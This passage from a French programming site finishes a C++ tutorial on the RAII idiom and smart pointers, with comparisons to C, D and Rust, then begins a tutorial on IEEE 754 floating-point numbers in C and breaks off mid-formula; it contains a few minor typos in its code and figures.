ce qui me permet de dire ça ? Je laisse le créateur du C++ répondre . Bjarne Stroustrup In a system, we need a \"resource handle\" class for each resource. However, we don't have to have an \"finally\" clause for each acquisition of a resource. In realistic systems, there are far more resource acquisitions than kinds of resources, so the \"resource acquisition is initialization\" technique leads to less code than use of a \"finally\" construct. Traduction libre Dans un système, il faut une \"capsule RAII\" pour chaque ressource. Cependant, nous n'avons pas besoin d'une clause \"finally\" pour chaque acquisition de ressource. Dans des systèmes réalistes, il y a beaucoup plus d'acquisitions de ressources que de ressources, donc le RAII conduit à écrire moins de code que l'utilisation d'une construction avec \"finally\". Exemples d'application avec la bibliothèque standard La bibliothèque standard utilise énormément cet idiome, à travers des noms qui vous sont certainement familliers : std::string , std::array , std::vector , std::ifstream , etc. Quand on y réfléchit, a t-on déjà libéré manuellement un std::string ? Non, car c'est fait automatiquement pour nous. Et pour vous montrer à quel point la bibliothèque standard est infiniment supérieure à tout ce qu'on pourait faire manuellement, reprenons notre code de début en utilisant les mécanismes standards. void get_infos_from_db () { const int nb_trains = 2 ; Sgbd_Capsule sgbd ( \"trains.db\" ); std :: vector < std :: string > trains_names ; for ( int i = 0 ; i < nb_trains ; ++ i ) { std :: string buffer = \"SELECT name FROM trains WHERE id = \" + std :: to_string ( i ); trains_names . push_back ( do_request ( sgbd , buffer )); } std :: ifstream file ( \"saved.txt\" ); Lock * lock = lock_acquire (); do_some_stuff ( trains_name , file , lock ); lock_release ( lock ); } N'est ce pas plus clair à lire et à comprendre ? Premier point à retenir : toujours utiliser au maximum la bibliothèque standard . Pourquoi se frustrer à faire un code comme on ferait en C quand on peut profiter de mécanismes éprouvés, performants et sûrs comme ceux proposés par la bibliothèque standard ? Donc faites-y appel le plus possible, ce sera du temps et du confort de gagnés. Cas particulier des pointeurs Notre code n'est pas encore tout à fait satisfaisant. En effet, il reste un pointeur. Hors, les pointeurs nus sont source de beaucoup de problèmes en C++. Et si on pouvait ne pas avoir à écrire Sgbd_Capsule , ce serait encore mieux. Heureusement, la bibliothèque standard arrive encore une fois à notre secours en fournissant des pointeurs intelligents qui nous libèrent des contraintes de libération que l'on connait si bien en C. La norme C++11 nous propose plusieurs types de pointeurs intelligents : std::auto_ptr : déprécié, à ne plus utiliser ; std::unique_ptr : comme son nom l'indique, à utiliser quand on ne veut avoir qu'un seul pointeur sur un objet ; std::shared_ptr : utilise un système de comptage de référence qui permet que plusieurs pointeurs pointent un même objet, ce dernier étant libéré quand le dernier pointeur pointant dessus est détruit ; std::weak_ptr : si l'on y prend pas garde, les std::shared_ptr peuvent entrainer un problème de références circulaires (lisez donc cet article de Developpez qui illustre ce problème). Il sert également dans le cas d'une ressource avec plusieurs observateurs non propriétaire. Je vous invite à lire cet article pour des explications plus approfondies sur lequel choisir. Nous avons également deux templates bien pratiques : std::make_shared<T> : construit un objet T et le met dans un std::shared_ptr (disponible avec C++11) ; std::make_unique<T> : construit un objet T et le met dans un std::unique_ptr (disponible avec C++14, voir ici pour une implémentation en C++11). Ces templates sont à utiliser le plus possible car ils permettent d'écrire un code exception-safe . Lisez l'article de Herb Sutter à ce propos. Et en plus, le mieux du mieux, on peut définir des deleters , c'est à dire définir comment le pointeur va libérer sa ressource. Il suffit simplement de créer une classe sur ce modèle que l'on passera ensuite en argument à notre pointeur intelligent. class Deleter { public : template < typename T > void operator ()( T * ptr ) const { /* Opérations diverses pour libérer la ressource */ } }; Et comme un exemple vaut mille explications, utilisons ce principe avec notre SGBD et notre mécanisme de verrouillage qui se pretent bien au jeu. Mais comme rien n'est parfait, les fonctions std::make_shared<T> et std::make_unique<T> ne prennent pas de deleter en argument. Il nous faut passer par la construction classique. class SGBD_deleter { public : void operator ()( SGBD * sgbd ) const { SGBD_release ( sgbd ); } }; class Lock_deleter { public : void operator ()( Lock * lock ) const { lock_release ( lock ); } }; void get_infos_from_db () { const int nb_trains = 2 ; std :: unique_ptr < SGBD , SGBD_deleter > sgdb { SGBD_Init ( \"train.db\" ), SGBD_deleter ()}; std :: vector < std :: string > trains_names ; for ( int i = 0 ; i < nb_trains ; ++ i ) { std :: string buffer = \"SELECT name FROM trains WHERE id = \" + std :: to_string ( i ); trains_names . push_back ( do_request ( sgbd , buffer )); } std :: ifstream file ( \"saved.txt\" ); std :: unique_ptr < Lock , Lock_deleter > lock { lock_acquire (), Lock_deleter ()}; do_some_stuff ( trains_name , file , lock ); } Les pointeurs intelligents nous permettent également d'éviter le problème du constructeur qui alloue lui-même de la mémoire que nous avons vu dans la section précédente. En effet, les pointeurs intelligents seront bien libérés même si l'on rencontre une exception. Donc utilisez-les dès que vous pouvez, quite à réécrire une version fonctionelle des pointeurs intelligents ou utiliser Boost si vous ne pouvez pas compiler en C++11 / C++14. Deuxième point à retenir : chaque fois qu'il est nécessaire d'utiliser des pointeurs, utilisez des pointeurs intelligents . Les cas où vous devrez obligatoirement utiliser des pointeurs nus sont très rares, alors utilisez la solution la plus confortable. Bonnes pratiques L'idéal, quand on gère des ressources, est de les libérer dès que possible . Non seulement cela est obligatoire dans certains cas (afin de ne pas faire attendre un processus trop longtemps pour ouvrir un fichier par exemple), mais en plus cela permet de soulager le système. Comment traduire cette bonne pratique en utilisant l'idiome RAII ? Et bien il faut que l'on détruise nos objets s'occupant des ressources le plus vite possible, ce qui est possible en utilisant des blocs d'instructions. int value ; { // Début du bloc d'instructions std :: ifstream f ( \"test.txt\" ); if ( f . is_open ()) { f >> value ; } } // Fin du bloc d'instruction : appel du destructeur du fichier value = value * 4 ; Il s'agit d'une pratique courante que vous pourrez voir dans certains codes. Et bien entendu, le corolaire : ne déclarer vos objets que quand vous en avez besoin et pas avant. Alors oubliez les réflexes du C89 qui consistent à déclarer toutes les variables au début d'un bloc et ne le faite que pour un usage immédiat (sauf exception). La const-correctness Ce n'est pas une bonne pratique spécifique au RAII, mais dès qu'une ressource est censée être constante, alors il faut impérativement utiliser le mot-clef const . Cela donne des garanties à l'utilisateur et, couplé avec des références, permet un passage en argument plus rapide. void bar ( std :: string const & data ) { // Ici, on est certain que data ne sera pas modifiée. // On utilise le passage par référence pour éviter une recopie inutile. } D'ailleurs, petite astuce (merci Herb Sutter ), si l'on veut déclarer un objet constant alors que ses paramètres dépendent de conditions, on peut y arriver grâce aux lambdas. #include <iostream> class Test { public : Test ( int number ) : m_number ( number ) { } int number () const { return this -> m_number ; } private : int m_number ; }; int main () { const Test a ( 1 ); const Test f = [ & ] { Test f = Test ( 6 ); if ( a . number () == 1 ) { f = Test ( 42 ); } return f ; }(); std :: cout << \"Valeur de f : \" << f . number () << std :: endl ; return 0 ; } Valeur de f : 42 Et dans les autres langages ? Bien que le C++ ait été le précurseur et le plus grand utilisateur de l'idiome RAII, aujourd'hui il n'est plus le seul. D'autres langages permettent, par des moyens assez similaires, d'utiliser une sorte de RAII. Avec C Bien que cette possibilité soit offerte par une extension de GCC et donc non-standard, elle mérite le détour et peut être intéressante pour ceux dont les applications ne seront compilées que par GCC. Il s'agit de l'attribut cleanup . Voici un exemple tiré de la page Wikipédia consacrée au RAII. static inline void fclosep ( FILE ** fp ) { if ( * fp ) fclose ( * fp ); } #define _cleanup_fclose_ __attribute__((cleanup(fclosep))) void example_usage () { _cleanup_fclose_ FILE * logfile = fopen ( \"logfile.txt\" , \"w+\" ); fputs ( \"hello logfile !\" , logfile ); /* logfile est correctement fermé sans appel explicite à fclose */ } Avec D Le D fournit trois méthodes pour permettre la libération des ressources, dont une identique à celle utilisée en C++ : le couple constructeur / destructeur d'une classe. Les exemples suivants sont tirés du site officiel . class Lock { Mutex m ; this ( Mutex m ) { this . m = m ; lock ( m ); } ~ this () { unlock ( m ); } } void abc () { Mutex m = new Mutex ; auto l = scoped ! Lock ( new Lock ( m )); foo (); } La seconde façon se rapproche de celle de Java avec un try - finally . void abc () { Mutex m = new Mutex ; lock ( m ); // lock the mutex try { foo (); // do processing } finally { unlock ( m ); // unlock the mutex } } Enfin, il existe une troisième méthode, originale par rapport aux deux autres : scope(exit) . Tout le code qui sera placé après cette instruction sera exécuté peu importe si la fonction se termine normalement ou si une exception est lancée. Elle se décline également sous deux autres formes : scope(failure) où le code ne sera exécuté qu'en cas d'exception et scope(success) où le code sera exécuté en cas de déroulement normal. La documentation complètera mes explications. void abc () { Mutex m = new Mutex ; lock ( m ); // lock the mutex scope ( exit ) unlock ( m ); // unlock on leaving the scope foo (); // do processing } Avec Rust Rust, langage développé par la fondation Mozilla, utilise le RAII de la même manière que C++. Et comme un code est plus parlant, voici celui tiré de la page consacrée au RAII avec Rust. fn create_box () { // Allocate an integer in the heap let _function_box = box 3 i ; // `_function_box` gets destroyed here, memory gets freed } fn main () { // Allocate an integer in the heap let _boxed_int = box 5 i ; // new (smaller) scope { // Another heap allocated integer let _short_lived_box = box 4 i ; // `_short_lived_box` gets destroyed here, memory gets freed } // Create lots of boxes for _ in range ( 0 u , 1_000 ) { create_box (); } // `_boxed_int` gets destroyed here, memory gets freed } $ rustc raii.rs && valgrind ./raii ==26873== Memcheck, a memory error detector ==26873== Copyright (C) 2002-2013, and GNU GPL'd, by Julian Seward et al. ==26873== Using Valgrind-3.9.0 and LibVEX; rerun with -h for copyright info ==26873== Command: ./raii ==26873== ==26873== ==26873== HEAP SUMMARY: ==26873== in use at exit: 0 bytes in 0 blocks ==26873== total heap usage: 1,013 allocs, 1,013 frees, 8,696 bytes allocated ==26873== ==26873== All heap blocks were freed -- no leaks are possible ==26873== ==26873== For counts of detected and suppressed errors, rerun with: -v ==26873== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 2 from 2) Nous voilà arrivé à la fin de cet article qui, je l'espère, vous en aura appris un peu plus sur C++. Bien entendu, le RAII n'est pas parfait : le pire qui puisse arriver est une erreur dans le destructeur. Mais hormis ces cas critiques, c'est un idiome particulièrement pratique et puissant, alors usez-en et abusez-en !"},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/maitrisez-les-nombres-a-virgule-en-c","title":"Les nombres à virgule flottante","text":"Le langage C, comme d'autres, propose des types pour représenter les nombres réels. Cependant, leur emploi n'est pas aussi simple qu'on pourrait l'espérer. La norme informatique IEEE 754 décrit le codage en mémoire des nombres dits à « virgule flottante » . On va la passer en revue pour comprendre et résoudre les difficultés liées à l'utilisation des nombres réels en informatique. On alternera parties théoriques (qui concernent l'informatique en général) et parties pratiques (avec le langage C). Au programme : rappels de C ; la norme IEEE 754 et ses conséquences (valeurs possibles, etc.) ; inconvénients des nombres flottants en C ; comparer des nombres flottants ; la norme C et les implémentations. Prérequis : le système binaire , dont : les bits, octets, etc. , la notation hexadécimale , et les façons principales de coder un entier relatif . PS : Ce tutoriel a été entièrement pensé, traité et mis en forme par Maëlan ; informaticienzero ne s'est occupé que d'adapter le tutoriel en Markdown pour le mettre en ligne sur PDP. Toutes les questions, remarques et félicitations vont donc à Maëlan ! — informaticienzero Introduction : les nombres à virgule flottante Virgule fixe, virgule flottante Une certaine précision Des constantes inexactes… Les nombres à virgule en C Syntaxe Les types numériques Intérêt des nombres flottants Écrire une constante Quelques informations pratiques Entrée et sortie formatées : printf & scanf Les fonctions mathématiques avec <math.h> IEEE 754 : le codage en mémoire d'un nombre flottant Principes généraux Les différents types de nombres représentables Nombres dénormalisés Un peu de mathématiques Retrouver la valeur du nombre flottant Exemple 1 : Nombre normalisé Exemple 2 : Nombre dénormalisé Intervalle entre les nombres en fonction de l'exposant Précision et chiffres significatifs IEEE 754 : Exceptions & arrondis Les exceptions Les arrondis Remarque hors-sujet (mais importante) L'environnement des flottants : Comparer des nombres flottants L'infâme traîtrise de l'opérateur == L'écart absolu & l'écart relatif La représentation en mémoire convertie en entier Code complet En-tête Fichier source Mais qu'en dit la norme C ? IEEE 754 et la norme C En pratique : savoir si l'implémentation utilise IEEE 754 Introduction : les nombres à virgule flottante Virgule fixe, virgule flottante Commençons par présenter ce dont on va parler en long, en large et en travers. En informatique, on parle de « virgule flottante » lorsque le système utilisé pour coder les nombres en mémoire permet de faire varier la place de la virgule, c'est-à-dire l'ordre de grandeur (par exemple en base 10, avec la même séquence de chiffres « 421337 », on peut coder 4,21337 ou 42,1337 ou 421,337…). Par opposition, dans un système à « virgule fixe », on aura toujours le même nombre de chiffres avant et après la virgule. Un système à virgule fixe permettra par exemple de représenter les nombres de l'intervalle $[0\\,;10[$ (un chiffre avant la virgule). En remplaçant la seule donnée du nombre $x\\in[0\\,;10[$ par une information de la forme $(x,p) \\in [1\\,;10[\\times[[-5\\,;5]]$ ($p$ entier), on crée un système à virgule flottante qui permet de coder les nombres de l'intervalle $[1.10&#94;{-5}\\,; 10.10&#94;5[$ de cette façon : $x.10&#94;p$. La contrainte sur la valeur de $x$ — il est supérieur à 1, autrement dit a exactement un chiffre avant la virgule — garantit que le codage d'un nombre est unique. Remarque : Dans la suite, j'appellerai « partie significative » d'un nombre, ce nombre écrit en notation scientifique sans la puissance de 10 associée (c'est-à-dire le nombre à virgule avec un seul chiffre avant la virgule). Une certaine précision On voit donc l'intérêt d'une représentation flottante : elle permet de coder un intervalle bien plus important, bien que toujours limité. Les contraintes physico-informatiques du monde réel fait qu'on dispose pour l'entier $p$ d'un nombre fini de valeurs, ce qui borne l'intervalle représentable. Ces mêmes contraintes font aussi que le réel $x$ présente une précision limitée ; ainsi, on ne code pas réellement tous les réels de l'intervalle, mais seulement des approximations à un certain nombre de chiffres. Cette idée est cruciale, comme on le verra. Bien sûr, concrètement ce sera le binaire qui interviendra et non la base 10. Ceci nous amène à une seconde problématique. Des constantes inexactes… Les nombres décimaux (c'est-à-dire écrits en base 10) ne sont pas toujours représentables de façon finie en binaire. De même qu'en base 10 on a 1/3 = 0,3333…, en binaire 1/10 = 0b 0,00011001100110011… avec une infinité de 0011. Ainsi, lorsqu'on écrit une constante dans un code source, on n'est pas assuré d'obtenir une valeur exacte (typiquement, 0,1 est arrondi). En particulier, une partie significative écrite en base 10 ou une puissance de 10 négative (on divise par une puissance de 10) peuvent mener à des nombres inexacts. En fait, seuls les nombres dont la partie décimale est le résultat d'une division par une puissance de 2 (comme 0,5 = 1/2, 0,75 = 3/4 ou 0,625 = 5/8) sont représentables exactement en binaire. Les nombres à virgule en C Après cette introduction aux problématiques principales des nombres à virgule flottante, je vous propose de passer en revue les fonctionnalités du langage C à leur sujet. Cela nous servira puisqu'on utilisera le C tout au long de ce cours pour illustrer notre étude théorique des nombres flottants. Syntaxe Les types numériques Le C met à notre disposition les types float et double (ainsi que long double , dont nous ne parlerons pas) pour stocker des nombres flottants. Ne rêvons pas, on fait du C donc leur taille en mémoire dépend de l'architecture de l'ordinateur, mais très souvent ce sera 32 bits pour un float et 64 bits pour un double . Un sizeof vous assurera de leur taille chez vous. Intérêt des nombres flottants Les types flottants ne sont pas seulement utiles pour manipuler des nombres à virgule, ils peuvent aussi servir pour stocker de très grands nombres . En effet, un float permet d'atteindre $10&#94;{38}$, et un double $10&#94;{308}$. Toutefois, comme on l'a déjà dit, la précision est limitée et ne pourra évidemment pas conserver la valeur exacte d'un nombre à 38 ou 308 chiffres, le nombre sera arrondi. Écrire une constante Une constante flottant s'écrit sous la forme : -3141.59e7 (ou avec un E majuscule), ce qui signifie $-3141,59 ×10&#94;7$. La dernière partie indique l' e xposant, qui peut bien sûr être négatif (comme dans 945.68e-3 ). On peut omettre diverses portions de cette syntaxe, comme le signe, l'exposant, la partie fractionnaire ou même la partie entière. En revanche, sans point ni exposant, le compilateur produira une constante entière (au pire, il est possible d'écrire 42. au lieu de 42.0 ). Le type par défaut d'une telle constante est double , mais on peut le changer avec un suffixe (minuscule ou majuscule) : f produit un float , l un long double . Par exemple, .1e-3f ou 42.1337e-3l . Enfin, depuis C99 on peut écrire les constantes en hexadécimal. La syntaxe est : 0xFF24.A3p17 qui signifie $\\text{0x42F3,A3}\\times2&#94;{17}$. Attention, la partie significative s'écrit en base 16, mais l'exposant (obligatoire) s'écrit en base 10 et désigne une puissance de 2 ! L'intérêt ? Obtenir une valeur exacte ! On a vu dans la partie précédente qu'écrire une constante en base 10 ne garantissait pas qu'elle soit représentée exactement en binaire. Spécifier la partie significative en hexadécimal et l'exposant en termes de puissance de 2 résout ce problème (dans la limite de la capacité du type, bien sûr). Quelques informations pratiques Entrée et sortie formatées : printf & scanf Par commodité, voici un tableau résumé des formateurs pour lire ou écrire des nombres flottants. Bien sûr, consultez le manuel pour des informations plus complètes (le format est extrêmement configurable). Type Utilisation %f , %F Écrit le double sous la forme usuelle : la sortie est du type [-]XXXX.XXX , où les X sont des chiffres de 0 à 9 et [-] symbolise le signe « moins » éventuel. %e , %E Écrit le double en écriture scientifique ; la sortie est du type [-]X.XXXXXXeYY (le formateur %E donne un E majuscule). %g , %G Un mélange des formateurs précédents : utilise le premier style si le nombre n'est pas trop grand ou trop petit, le deuxième style sinon. Remarquez que tous ces formateurs attendent des flottants de type double . Il n'en existe pas pour float , ce qui est sans importance car on peut effectuer la conversion pour l'affichage (elle est automatique avec la syntaxe de printf ). Le C99 nous permet d'ajouter la lettre L majuscule entre % et le formateur afin de correspondre à un long double . Type Utilisation %f , %F , %e , %E , %g , %G Lit un nombre à virgule flottante et l'écrit dans la variable de type float indiquée. Le nombre lu doit respecter la même syntaxe que les constantes du langage C. Contrairement à printf , tous ces formateurs sont équivalents. Attention ! Contrairement à printf , scanf travaille par défaut avec des float . Pour lire un double , il faut ajouter la lettre l minuscule entre % et le formateur ; pour un long double , il faut ajouter L (ou ll ). Les fonctions mathématiques avec <math.h> La bibliothèque standard du C met à notre disposition toute une gamme de fonctions mathématiques : valeur absolue, maximum de deux nombres, arrondis en tous sens, puissances, fonctions trigonométriques, exponentielles et logarithmes, etc. Ces fonctions sont définies dans l'en-tête <math.h> . Chacune des fonctions existantes se décline en trois versions : une qui travaille avec des double : celle qui porte le nom « de base » (par exemple, floor , qui arrondit à l'inférieur) ; une qui travaille avec des float : il faut ajouter la lettre f à la fin du nom de la fonction ( floorf dans notre exemple) ; une qui travaille avec des long double : il faut ajouter la lettre l à la fin du nom de la fonction ( floorl ). Attention : lors de l'édition des liens, ces fonctions ne sont pas liées automatiquement à l'exécutable avec le reste de la bibliothèque standard, il faut le faire manuellement. Sous GCC, cela se fait avec le paramètre -lm . Voilà, on a fini avec les ennuyantes questions de syntaxe, et nous pouvons maintenant aborder sereinement le cœur de ce cours. IEEE 754 : le codage en mémoire d'un nombre flottant On va maintenant s'intéresser à la manière dont sont représentés en mémoire les nombres à virgule flottante. Ce que vais vous raconter dans cette partie n'est pas dans la norme C . La suite de ce cours se base sur la norme IEEE 754 (ou plus précisément ANSI/IEEE Std 754-1985). Celle-ci spécifie : la manière de représenter les nombres flottants en mémoire avec plusieurs formats ; cinq opérations associées : l'addition ( + ), la soustraction ( - ), la multiplication ( * ), la division ( / ) et la racine carrée ( sqrt() ) ; des modes d'arrondi ; des exceptions . On reparlera des deux derniers points plus tard. Cette norme est proposée par l'IEEE ( Institute of Electrical and Electronics Engineers ), une organisation américaine devenue référence en matière d'informatique. Puisque la norme C ne précise pas le codage utilisé, on peut en théorie tomber sur une implémentation qui en utilise un autre, mais dans les faits la norme IEEE 754 est aujourd'hui ultra-majoritaire. Un point sur la norme C sera fait à la fin de ce cours (ainsi qu'une manière de déterminer si IEEE 754 est bien employé chez soi). Principes généraux Pour coder un nombre à virgule flottante, IEEE 754 se base sur sa notation binaire scientifique. À partir du bit de poids fort, un nombre flottant se décompose donc en trois parties en mémoire. Le bit de signe vaut 0 si le nombre est positif, 1 s'il est négatif. Le signe des nombres flottants est donc codé par le bit de poids fort et non selon la règle du complément à 2. En conséquence, il existe deux représentations pour zéro (c'est néanmoins un défaut mineur, les implémentations gérant cette dualité ; par exemple, +0.0 == -0.0 renverra vrai ), et les valeurs possibles sont totalement « symétriques » par rapport à zéro (c'est la raison pour laquelle j'utiliserai souvent le symbole ± par la suite). L' exposant représente la puissance à laquelle il faut élever 2 (et non 10 !). Le nombre e de bits qu'il occupe dépend de la taille du type. C'est un entier relatif. Pour le représenter, on n'utilise ni la règle du bit de signe, ni celle du complément à 2 (cela compliquerait la comparaison de nombres flottants, comme on le verra ensuite) ; on décale la valeur codée en lui ajoutant $2&#94;{e-1}-1$, c'est-à-dire la valeur où tous les bits sauf celui de poids fort sont à 1 (donc 127 = 0b 01111111 si l'exposant est codé sur 8 bits, ou 1023 = 0b 01111111111 s'il est codé sur 11 bits). Ainsi, avec e = 7, la valeur 17 sera codée par 17+127 = 144 tandis que -23 sera codé par -23+127 = 104. Par la suite, j'emploierai les termes d'exposant décalé et réel décalé et codé pour différencier l'exposant tel qu'il est codé en mémoire de l'exposant ainsi représenté. La mantisse code la partie décimale en notation binaire scientifique du nombre flottant. Sauf cas particuliers (zéro et certains nombres très petits) dont on reparlera, la partie entière vaut forcément 1 en binaire, c'est pourquoi on ne la donne pas. On parle de bit implicite . On économise ainsi un bit, ce qui permet d'avoir une précision plus grande. La mantisse occupe les bits de poids faibles restants. IEEE 754 spécifie deux grands formats basés sur ce modèle ; les deux types principaux du C pour les nombres à virgule flottante correspondent à ces deux formats. Nom dans la norme IEEE 754 Type en C Taille totale s e m Chiffres significatifs en base 10 Valeur absolue minimale Valeur absolue maximale simple précision float 32 bits 1 8 23 7 $1 $3 double précision double 64 bits 1 11 52 16 $2 $1 s , e et m sont le nombre de bits occupés par le signe, l'exposant et la mantisse, respectivement. Nous détaillerons plus tard les trois dernières colonnes. En résumé (pour un float de 32 bits), la représentation de -3141,5 est : Les différents types de nombres représentables Il y a cependant des cas particuliers, car un nombre à virgule flottante peut représenter autre chose que des nombres « normaux ». Il peut aussi valoir : l'infini positif ou négatif (noté $\\infty$). C'est par exemple le résultat de la division d'un nombre non nul par zéro (le signe dépendant alors du signe du numérateur et du zéro en dénominateur) ; NaN ( not a number ). NaN est une valeur spéciale utilisée pour signaler une erreur , comme dans $0 \\div 0$ ou $\\sqrt{-1}$. N'importe quel calcul avec un NaN doit renvoyer NaN (sauf quelques exceptions), et n'importe quelle comparaison avec un NaN doit renvoyer faux (sauf != ) ; NaN n'est même pas égal à lui-même, c'est pourquoi x==x peut renvoyer faux ; enfin, on n'a pas encore réglé le problème de zéro. Quelques calculs avec ces valeurs particulières (le symbole ± signifie que le signe du résultat dépend de celui des deux opérandes selon la règle des signes) : $x \\div 0 = \\pm\\infty$ ; $0 \\div \\infty = \\pm0$ ; $\\infty \\div \\infty = \\text{NaN}$ ; $0 \\times \\infty = \\text{NaN}$ ; $(+\\infty) + (+\\infty) = +\\infty$ ; $(+\\infty) - (+\\infty) = \\text{NaN}$. Ça ne nous autorise pas à écrire des choses comme var / 0 dans un programme ! En effet, la division par zéro de nombres entiers a un comportement indéterminé, c'est-à-dire non prévu par la norme du langage C. Ça signifie qu'il peut se passer n'importe quoi, selon le bon plaisir du compilateur, du système d'exploitation… Cela provoque une erreur fatale généralement et un beau plantage dans les règles de l'art. En fait, c'est également indéterminé pour des nombres flottants. Les règles de calcul ci-dessus ne sont en fait garanties que par la norme IEEE 754, et non par la norme C elle-même. Pour représenter tout ce petit monde, on utilise des valeurs spéciales de l'exposant. Si l'exposant est maximal (tous les bits à 1) et que la mantisse n'est pas nulle, alors c'est NaN . Si l'exposant est maximal et que la mantisse est nulle, alors c'est l'infini (positif ou négatif selon le bit de signe). Si l'exposant est minimal (tous les bits à 0) et que la mantisse n'est pas nulle, alors c'est un nombre dénormalisé : on considère que le bit implicite (la partie entière en notation scientifique) vaut 0. Si l'exposant décalé vaut 0 et que la mantisse est nulle, alors c'est zéro (positif ou négatif selon le bit de signe). Dans tous les autres cas, c'est un nombre normalisé : on considère que le bit implicite vaut 1. C'est le cas « normal ». Récapitulons avec un joli tableau pour le format 32 bits : Type Codage binaire Codage hexadécimal Valeur Not a Number [0/1] — 11111111 — 11111111111111111111111 ⋮ [0/1] — 11111111 — 00000000000000000000001 [7/F]F FF FF FF ⋮ [7/F]F 80 00 01 NaN infini [0/1] — 11111111 — 00000000000000000000000 [7/F]F 80 00 00 $± \\infty$ nombre normalisé [0/1] — 11111110 — 11111111111111111111111 ⋮ [0/1] — 00000001 — 00000000000000000000000 [7/F]F 7F FF FF ⋮ [0/8]0 80 00 00 $± 3 nombre dénormalisé [0/1] — 00000000 — 11111111111111111111111 ⋮ [0/1] — 00000000 — 00000000000000000000001 [0/8]0 7F FF FF ⋮ [0/8]0 00 00 01 $± 1 zéro [0/1] — 00000000 — 00000000000000000000000 [0/8]0 00 00 00 ± 0 À titre informatif, voici aussi le même tableau pour le format 64 bits (sans le binaire, ça prend trop de place). Type Codage hexadécimal Valeur Not a Number [7/F]F FF FF FF FF FF FF FF ⋮ [7/F]F F0 00 00 00 00 00 01 NaN infini [7/F]F F0 00 00 00 00 00 00 $± \\infty$ nombre normalisé [7/F]F EF FF FF FF FF FF FF ⋮ [0/8]0 10 00 00 00 00 00 00 $± 1 Nombre dénormalisé [0/8]0 0F FF FF FF FF FF FF ⋮ [0/8]0 00 00 00 00 00 00 01 $± 2 Zéro [0/8]0 00 00 00 00 00 00 00 ± 0 Notons que pour passer d'un nombre positif à son équivalent négatif, il suffit d'additionner 0x 8000 0000 à sa représentation en mémoire ( 0x 8000 0000 0000 0000 pour un double ). Ceci nous servira plus tard. Nombres dénormalisés Attardons-nous sur les nombres dénormalisés. Un nombre dénormalisé est un nombre si petit (en valeur absolue) que l'on ne peut pas le représenter en mémoire en se basant sur son écriture scientifique. Par exemple, $0b 1011 ×2&#94;{-133}$ (soit environ $1{,}0101905 ×10&#94;{-39}$) a pour écriture scientifique $0b 1{,}011 ×2&#94;{-130}$, mais on ne peut pas stocker l'exposant -130 avec le format 32 bits. On ruse donc en écrivant le nombre avec le plus petit exposant possible. Quel est cet exposant pour le format 32 bits ? Si vous avez répondu -127, vous êtes tombés dans le piège ! Pourtant, -127 est bien l'exposant minimal qu'on puisse coder et qui représente les nombres dénormalisés. En fait, les gens de chez IEEE ont décidé de compliquer la chose. Ils ont décidé que, pour les nombres dénormalisés, bien que la valeur en mémoire soit -127, l'exposant codé serait -126 , c'est-à-dire le même que pour les plus petits nombres normalisés. Cette exception permet d'assurer une sorte de continuité entre zéro, les nombres dénormalisés et les premiers nombres normalisés. Puisqu'ils ont le même exposant, ceux-ci sont en effet disposés à intervalles réguliers (de pas $2&#94;{126}$). Dans notre exemple, cela donne $+0b0{,}0001011 ×2&#94;{-126}$, qu'on code ensuite ceci comme un nombre normalisé : Vous comprenez maintenant pourquoi le bit implicite est à 0 pour un nombre dénormalisé. Pour le format 32 bits, l'exposant sera -1022. On peut trouver plusieurs raisons à l'introduction des nombres dénormalisés. Historiquement, l'exposant minimal servait pour représenter zéro, quelle que soit la valeur de la mantisse ; les nombres dénormalisés ont été introduits en 1985 avec la première version de la norme IEEE 754. D'ailleurs, si l'on avait choisi des nombres normalisés pour « remplir » cette plage de valeurs, la représentation de zéro n'aurait plus été cohérente avec celle-ci à cause du bit implicite. Les nombres dénormalisés permettent de représenter des nombres bien plus petits en valeur absolue. En effet, le plus petit nombre dénormalisé est $0b 0{,}00000000000000000000001 ×2&#94;{-126}$, soit $1 ×2&#94;{-149}$ ; avec des nombres normalisés, ça aurait été $0b 1,00000000000000000000001 ×2&#94;{-127}$. Cependant, tout cela a un coût. En plus de tout compliquer, les nombres dénormalisés perdent en précision au fur et à mesure qu'ils se rapprochent de zéro : c'est ce que nous allons voir dans la partie suivante. Un peu de mathématiques Dans cette partie, nous allons continuer à approfondir les aspects théoriques. Nous allons étudier les propriétés mathématiques de ces nombres flottants, en particulier le passage du codage en mémoire à la valeur représentée. Retrouver la valeur du nombre flottant Pour la suite, vous devrez être à l'aise avec le binaire car je ne détaillerai pas les calculs. Sinon, autant passer cette partie. Il n'est évidemment pas utile de connaître par cœur les formules qu'on obtiendra, l'essentiel est de comprendre le principe. Pour la suite, on note : $flottant$ la valeur du flottant représenté ; $m$ et $e$ le nombre de bits occupés par la mantisse et l'exposant (respectivement) ; $mantisse$ la mantisse (plus précisément, sa représentation entière) ; $exposant$ l'exposant non-décalé (en termes de puissances de 2) ; le décalage de l'exposant est $décalage = 2&#94;{e-1}-1$ , on en déduit les valeurs limites de l'exposant ; la valeur minimale de l'exposant non-décalé, réservée aux zéros et nombres dénormalisés, est $exposantMin = 0 - décalage = 1 - 2&#94;{e-1}$ (mais l'exposant réel des dénormalisés est $exposantMin+1$) ; la valeur maximale de l'exposant non-décalé, réservée aux infinis et NaN, est $exposantMax = (2&#94;e-1) - décalage = 2&#94;{e-1}$. Pour retrouver la partie significative de la notation scientifique, il suffit de faire $1+\\frac{mantisse}{2&#94;m}$ si le nombre est normalisé, ou $0+\\frac{mantisse}{2&#94;m}$ s'il est dénormalisé. 1 ou 0 représente la partie entière du flottant (c'est-à-dire le bit implicite). La fraction qui suit représente la partie décimale (on a $0\\le\\frac{mantisse}{2&#94;m}<1$ ). Ensuite, il suffit de multiplier par la puissance de 2 indiquée par l'exposant réel, et d'adapter le signe selon le bit de signe : $flottant = \\pm\\enspace (1+\\frac{mantisse}{2&#94;m})\\times2&#94;{exposant}$ (normalisé) ; $flottant = \\pm\\enspace (0+\\frac{mantisse}{2&#94;m})\\times2&#94;{exposantMin+1}$ (dénormalisé). Exemple 1 : Nombre normalisé $[\\begin{aligned}flottant = - (1 + \\frac{\\textit{0b} 10001000101100000000000}{2&#94;{23}}) \\times2&#94;{11} = - (1 + \\frac{4,478976\\times10&#94;6}{2&#94;{23}}) \\times2&#94;{11} = -3141{,}5\\end{aligned}]$ On retrouve bien -3141,5. Exemple 2 : Nombre dénormalisé $[\\begin{aligned}flottant = + (0 + \\frac{\\textit{0b} 00010110000000000000000}{2&#94;{23}}) \\times2&#94;{-127+1}\\ = + (0 + \\frac{720896}{2&#94;{23}}) \\times2&#94;{-126} \\approx + 